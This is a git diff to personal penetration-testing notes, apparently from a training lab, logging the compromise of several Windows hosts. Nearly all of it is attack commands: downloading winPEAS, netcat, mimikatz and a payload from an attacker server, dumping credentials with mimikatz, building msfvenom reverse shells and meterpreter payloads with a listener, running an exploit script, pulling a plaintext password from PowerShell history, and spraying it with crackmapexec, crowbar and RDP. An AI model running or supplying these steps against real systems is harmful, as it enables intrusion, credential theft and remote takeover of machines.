@@ -20,6 +20,7 @@ nc -nvlp 1234
 Get-Childitem –Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
 ```
+
 .141 privesc
 ```
 iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
@@ -51,7 +52,7 @@ iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe
 ```
 .141 post exploitation
 ```
-iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
+iwr -uri http://192.168.45.219/mimikatz.exe -Outfile mimikatz.exe
 . .\mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
@@ -245,7 +246,39 @@ run -j
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe
 
-python3 49601.py 192.168.225.145 192.168.45.218 met.exe
+python2 49601.py 192.168.225.145 192.168.45.218 met.exe
+```
+
+.145 privesc
+```
+iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+
+# find zachary is an admin
+# we can write to C:\Users\Public
+C:\Program Files (x86)\Mouse Server\Mouse Server Luminati.exe
+type C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+"&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+
+-pw 'Th3R@tC@tch3r' zachary@127.0.0.1
+# password works
+crackmapexec smb 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' --continue-on-success
+
+# connecting via smb or winrm fail
+crackmapexec 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' -X whoami
+crackmapexec winrm 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' --continue-on-success
+
+# rdp should work based on success of this command
+crowbar -b rdp -s 192.168.225.145/32 -u zachary -C zachary-pass -n 1
+xfreerdp /cert-ignore /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.225.145
+
+zachery - BrokenPolarizedCattle963
+crackmapexec winrm 192.168.225.145 -u zachery -p 'BrokenPolarizedCattle963' --continue-on-success
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f exe -o shell.exe
+nc -nvlp 9999
+iwr -uri http://192.168.45.219/shell.exe -Outfile shell.exe
+
 ```
 
 .142
